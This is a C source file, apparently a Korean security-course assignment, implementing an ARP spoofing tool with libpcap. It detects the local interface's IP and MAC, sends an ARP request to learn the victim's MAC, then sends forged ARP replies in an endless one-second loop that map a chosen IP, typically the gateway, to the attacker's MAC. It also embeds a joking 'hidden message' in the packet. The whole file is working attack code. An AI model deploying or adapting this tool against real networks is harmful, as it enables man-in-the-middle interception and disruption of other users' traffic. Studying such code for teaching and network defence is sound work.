#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <net/if.h>
#include <netdb.h>

#define REQ_CNT 20

typedef struct parameter_set {
	u_char Victim_IP[4];
	u_char Victim_MAC[6];
	u_char Attacker_IP[4];
	u_char Attacker_MAC[6];
	
	u_char Fake_IP[4];
} PARAMETER_SET;


void convrt_mac( const char *data, char *cvrt_str, int sz );  // MAC address를 보기 좋게 변환하는 함수


int netInfo(PARAMETER_SET * param_set)
{
	int sockfd, cnt, req_cnt = REQ_CNT;
	char mac_adr[128] = {0x00,};

	struct sockaddr_in *sock;
	struct ifconf ifcnf_s;
	struct ifreq *ifr_s;

	sockfd = socket( PF_INET , SOCK_DGRAM , 0 );
	if( sockfd < 0 ) {
		perror( "socket()" );
		return -1;
	}

	memset( (void *)&ifcnf_s , 0x0 , sizeof(ifcnf_s) );
	ifcnf_s.ifc_len = sizeof(struct ifreq) * req_cnt;
	ifcnf_s.ifc_buf = (char *)malloc(ifcnf_s.ifc_len);
	
	if( ioctl( sockfd, SIOCGIFCONF, (char *)&ifcnf_s ) < 0 ) {
		perror( "ioctl() - SIOCGIFCONF" );
		return -1;
	}

	// ifc_len 사이즈가 우리가 할당한 사이즈보다 크다면 공간 재할당
	if( ifcnf_s.ifc_len > (sizeof(struct ifreq) * req_cnt) ) {
		req_cnt = ifcnf_s.ifc_len;
		ifcnf_s.ifc_buf = (char *)realloc( ifcnf_s.ifc_buf, req_cnt );
	}

	ifr_s = ifcnf_s.ifc_req;
	for( cnt = 0 ; cnt < ifcnf_s.ifc_len ; cnt += sizeof(struct ifreq), ifr_s++ )
	{
		if( ioctl( sockfd, SIOCGIFFLAGS, ifr_s ) < 0 ) {
			perror( "ioctl() - SIOCGIFFLAGS" );
			return -1;
		}

		// LOOPBACK에 대한 구조체이면 continue
		if( ifr_s->ifr_flags & IFF_LOOPBACK ){
			continue;
		}
	
		//parsing
		char *ptr;
		int i;

 		sock = (struct sockaddr_in *)&ifr_s->ifr_addr;
		printf( "\n<IP address> - %s\n" , inet_ntoa(sock->sin_addr) );

		/* Attacker IP 정보 추출 */
		ptr = strtok((char *)inet_ntoa(sock->sin_addr), "."); 
		i = 0;	
		while (ptr != NULL)               // 자른 문자열이 나오지 않을 때까지 반복
		{
			//printf("%s\n", ptr);
			param_set->Attacker_IP[i] = atoi(ptr);
			ptr = strtok(NULL, ".");      // 다음 문자열을 잘라서 포인터를 반환
			i++;
		}


		if( ioctl( sockfd, SIOCGIFHWADDR, ifr_s ) < 0 ) {
			perror( "ioctl() - SIOCGIFHWADDR" );
			return -1;
		}

		convrt_mac( ether_ntoa((struct ether_addr *)(ifr_s->ifr_hwaddr.sa_data)), mac_adr, sizeof(mac_adr) -1 );
		printf( "<MAC address> - %s\n\n" , mac_adr );

		/* Attacker MAC 정보 추출 */
		ptr = strtok(mac_adr, ".");
		ptr = strtok((char *)mac_adr, ":"); 
		i = 0;	

		while (ptr != NULL)               // 자른 문자열이 나오지 않을 때까지 반복
		{
			//printf("%s\n", ptr);
			param_set->Attacker_MAC[i] = (int)strtol(ptr, NULL, 16);
			ptr = strtok(NULL, ":");      // 다음 문자열을 잘라서 포인터를 반환
			i++;
		}
		
		printf("\n");
	}
     
	return 0;
}


void convrt_mac( const char *data, char *cvrt_str, int sz )
{
	char buf[128] = {0x00,};
	char t_buf[8];
	char *stp = strtok( (char *)data , ":" );
	int temp=0;
     
	do
	{
		memset( t_buf, 0x0, sizeof(t_buf) );
		sscanf( stp, "%x", &temp );
		snprintf( t_buf, sizeof(t_buf)-1, "%02X", temp );
		strncat( buf, t_buf, sizeof(buf)-1 );
		strncat( buf, ":", sizeof(buf)-1 );
	} while( (stp = strtok( NULL , ":" )) != NULL );

	buf[strlen(buf) -1] = '\0';
	strncpy( cvrt_str, buf, sz );
}


void setInit(PARAMETER_SET * param_set, char * argv[]) {
	char *ptr;
	int i;
	
	/* Victim IP 정보 추출 */
	ptr = strtok(argv[2], "."); 
	i = 0;	
	while (ptr != NULL)               // 자른 문자열이 나오지 않을 때까지 반복
	{
		param_set->Victim_IP[i] = atoi(ptr);
		ptr = strtok(NULL, ".");      // 다음 문자열을 잘라서 포인터를 반환
		i++;
	}
	
	/* Attacker IP & Attacker MAC 정보 추출 */
	netInfo(param_set);

	/* Fake IP 정보 추출 */
	ptr = strtok(argv[3], ".");
	i = 0;	
	while (ptr != NULL)               // 자른 문자열이 나오지 않을 때까지 반복
	{
		param_set->Fake_IP[i] = atoi(ptr);
		ptr = strtok(NULL, ".");      // 다음 문자열을 잘라서 포인터를 반환
		i++;
	}
}


void usage() {
	printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
	printf("sample: send_arp wlan0 192.168.10.2 192.168.10.1\n");
}


int main(int argc, char* argv[]) {

	PARAMETER_SET param_set;
	
	if (argc != 4) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
      
		return -1;
	}
	
	// SCENARIO #0 : Spoofing을 위한 정보 세팅
	setInit(&param_set, argv);

	//printf("===========정보 세팅 확인용===========\n");
	
	/*
	printf("%d\n", (int)param_set.Victim_IP[0]);
	printf("%d\n", (int)param_set.Victim_IP[1]);
	printf("%d\n", (int)param_set.Victim_IP[2]);
	printf("%d\n", (int)param_set.Victim_IP[3]);

	printf("\n");

	printf("%d\n", (int)param_set.Fake_IP[0]);
	printf("%d\n", (int)param_set.Fake_IP[1]);
	printf("%d\n", (int)param_set.Fake_IP[2]);
	printf("%d\n", (int)param_set.Fake_IP[3]);
	
	printf("\n");

	printf("%d\n", (int)param_set.Attacker_IP[0]);
	printf("%d\n", (int)param_set.Attacker_IP[1]);
	printf("%d\n", (int)param_set.Attacker_IP[2]);
	printf("%d\n", (int)param_set.Attacker_IP[3]);

	printf("\n");

	printf("%d\n", (int)param_set.Attacker_MAC[0]);
	printf("%d\n", (int)param_set.Attacker_MAC[1]);
	printf("%d\n", (int)param_set.Attacker_MAC[2]);
	printf("%d\n", (int)param_set.Attacker_MAC[3]);
	printf("%d\n", (int)param_set.Attacker_MAC[4]);
	printf("%d\n", (int)param_set.Attacker_MAC[5]);
	*/

	// SCENARIO #1 : 정상적인 ARP Request 요청
	printf("===========SCENARIO #1 : 정상적인 ARP Request 요청===========\n");
	char arp_packet[42];

	/* Destination MAC Address */
	for(int i=0; i<6; i++){
		arp_packet[i] = 0xff;
	}
	
	/*
	arp_packet[0] = 0xff;
	arp_packet[1] = 0xff;
	arp_packet[2] = 0xff;
	arp_packet[3] = 0xff;
	arp_packet[4] = 0xff;
	arp_packet[5] = 0xff;
	*/

	/* Source MAC Address */
	for(int i=0; i<6; i++){
		arp_packet[i+6] = param_set.Attacker_MAC[i];
	}
	
	/*
	arp_packet[6] = 0x00;
	arp_packet[7] = 0x0c;
	arp_packet[8] = 0x29;
	arp_packet[9] = 0xec;
	arp_packet[10] = 0x4f;
	arp_packet[11] = 0xe9;
	*/

	/* Ether Type */
	arp_packet[12] = 0x08;
	arp_packet[13] = 0x06;
	
	/* HardWare Type */
	arp_packet[14] = 0x00;
	arp_packet[15] = 0x01;

	/* Protocol Type */
	arp_packet[16] = 0x08;
	arp_packet[17] = 0x00;

	/* HardWare Size */
	arp_packet[18] = 0x06;

	/* Protocol Size */
	arp_packet[19] = 0x04;

	/* Request */
	arp_packet[20] = 0x00;
	arp_packet[21] = 0x01;

	/* Sender MAC Address */
	for(int i=0; i<6; i++){
		arp_packet[i+22] = param_set.Attacker_MAC[i];
	}

	/*
	arp_packet[22] = 0x00;
	arp_packet[23] = 0x0c;
	arp_packet[24] = 0x29;
	arp_packet[25] = 0xec;
	arp_packet[26] = 0x4f;
	arp_packet[27] = 0xe9;
	*/

	/* Sender IP Address */
	for(int i=0; i<4; i++){
		arp_packet[i+28] = param_set.Attacker_IP[i];
	}

	/*
	arp_packet[28] = 0xc0;
	arp_packet[29] = 0xa8;
	arp_packet[30] = 0x03;
	arp_packet[31] = 0xa9;
	*/

	/* Target MAC Address */
	for(int i=0; i<6; i++){
		arp_packet[i+32] = 0x00;
	}
	
	/*
	arp_packet[32] = 0x00;
	arp_packet[33] = 0x00;
	arp_packet[34] = 0x00;
	arp_packet[35] = 0x00;
	arp_packet[36] = 0x00;
	arp_packet[37] = 0x00;
	*/

	/* Target IP Address */
	for(int i=0; i<4; i++){
		arp_packet[i+38] = param_set.Victim_IP[i];
	}

	/*
	arp_packet[38] = 0xc0;
	arp_packet[39] = 0xa8;
	arp_packet[40] = 0x03;
	arp_packet[41] = 0x87;
	*/
	
	if(pcap_sendpacket(handle, (const u_char *)arp_packet, 42) != 0){
		printf("\nSENARIO#1 : Error sending the packet: \n");
		return 1;
	}
	

	printf(".\n");
	printf(".\n");
	printf(".\n");
	printf(".\n");
	printf(".\n");
	printf(".\n");
	
	// SCENARIO #2 :  ARP Reply 수신 후 이를 이용하여 victim의 MAC Address 얻어오기
	printf("===========SCENARIO #2 : ARP Reply 수신 victim의 MAC Address 얻어오기===========\n");
	while (true) {
		struct pcap_pkthdr* header;
      
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
    
		if (res == 0) {
			continue;
		}

		if (res == -1 || res == -2) {
			break;
 		}
		
		// ARP 프로토콜을 가진 Request(0x0002)이며 Sender IP가 일치할 경우
		if(packet[12] == 0x08 && packet[13] == 0x06 && 
			packet[20] == 0x00 && packet[21] == 0x02 &&
			packet[28] == param_set.Victim_IP[0] && packet[29] == param_set.Victim_IP[1] && packet[30] == param_set.Victim_IP[2] && packet[31] == param_set.Victim_IP[3]) { 
			
			printf("[PACKET DATA] %u bytes captured\n\n", header->caplen);
     	
			// Packet Data Print
			for(int i=0; i < header->caplen; i++) {
				printf("%02x|", packet[i]);
			
				if(i!=0 && (i+1) %16 == 0){
					printf("\n");
				}
			}
			
			for(int i=0; i<6; i++){
				param_set.Victim_MAC[i] = packet[i+22];
			}
			
			
			printf("\n\n[Victim MAC Address : %02x-%02x-%02x-%02x-%0x-%02x]\n", packet[22], packet[23], packet[24], packet[25], packet[26], packet[27]);

			break;
		}
	}

	
	/*
	printf("%d\n", (int)param_set.Victim_MAC[0]);
	printf("%d\n", (int)param_set.Victim_MAC[1]);
	printf("%d\n", (int)param_set.Victim_MAC[2]);
	printf("%d\n", (int)param_set.Victim_MAC[3]);
	printf("%d\n", (int)param_set.Victim_MAC[4]);
	printf("%d\n", (int)param_set.Victim_MAC[5]);
	*/


	// SCENARIO #3 :  ARP Spoofing을 통한 Victim_PC의 ARP Infection
	printf("===========SCENARIO #3 :  ARP Spoofing을 통한 Victim_PC의 ARP Infection===========\n");
	char infection_packet[100];

	for(int i=0; i<6; i++){
		infection_packet[i] = param_set.Victim_MAC[i];
	}
	
	/*
	infection_packet[0] = 0x00;
	infection_packet[1] = 0x0c;
	infection_packet[2] = 0x29;
	infection_packet[3] = 0x6d;
	infection_packet[4] = 0x28;
	infection_packet[5] = 0xbc;
	*/

	for(int i=0; i<6; i++){
		infection_packet[i+6] = param_set.Attacker_MAC[i];

	}

	/*
	infection_packet[6] = 0x00;
	infection_packet[7] = 0x0c;
	infection_packet[8] = 0x29;
	infection_packet[9] = 0xec;
	infection_packet[10] = 0x4f;
	infection_packet[11] = 0xe9;
	*/

	// Ether Type(0x0800:
	infection_packet[12] = 0x08;
	infection_packet[13] = 0x06;
	
	
	infection_packet[14] = 0x00;
	infection_packet[15] = 0x01;

	infection_packet[16] = 0x08;
	infection_packet[17] = 0x00;

	infection_packet[18] = 0x06;

	infection_packet[19] = 0x04;

	// OPCODE(0x0001:request, 0x0002:reply)
	infection_packet[20] = 0x00;
	infection_packet[21] = 0x02;
	
	// 변조할 MAC_ADRESS

	for(int i=0; i<6; i++){
		infection_packet[i+22] = param_set.Attacker_MAC[i];

	}

	/*
	infection_packet[22] = 0x01;
	infection_packet[23] = 0x02;
	infection_packet[24] = 0x03;
	infection_packet[25] = 0x04;
	infection_packet[26] = 0x05;
	infection_packet[27] = 0x06;
	*/

	for(int i=0; i<4; i++){
		infection_packet[i+28] = param_set.Fake_IP[i];


	}

	/*
	infection_packet[28] = 0xc0;
	infection_packet[29] = 0xa8;
	infection_packet[30] = 0x03;
	infection_packet[31] = 0x02;
	*/

	
	for(int i=0; i<6; i++){
		infection_packet[i+32] = param_set.Victim_MAC[i];

	}

	/*
	infection_packet[32] = 0x00;
	infection_packet[33] = 0x0c;
	infection_packet[34] = 0x29;
	infection_packet[35] = 0x6d;
	infection_packet[36] = 0x28;
	infection_packet[37] = 0xbc;
	*/

	for(int i=0; i<4; i++){
		infection_packet[i+38] = param_set.Victim_IP[i];

	}
	
	char * hidden_msg = "It's not my fault. I've just completed GilGil's quest";
	
	for(int i=0; i<53; i++){
		infection_packet[i+42] = hidden_msg[i];
	}	

	/*
	infection_packet[38] = 0xc0;
	infection_packet[39] = 0xa8;
	infection_packet[40] = 0x03;
	infection_packet[41] = 0x87;
	*/
	
	
	while(1) {
		sleep(1);
		printf("-> Victim의 Gateway MAC Address를 변조중입니다...\n");
		printf("-> 이건 모두 다 길길 멘토님께서 시키신 공격입니다. 전 아무 잘못없어요 '_' \n");
		if(pcap_sendpacket(handle, (const u_char *)infection_packet, 100) != 0){
			printf("\nError sending the packet: \n");
			return 1;
		}
	}
	
	
	return 0;
}
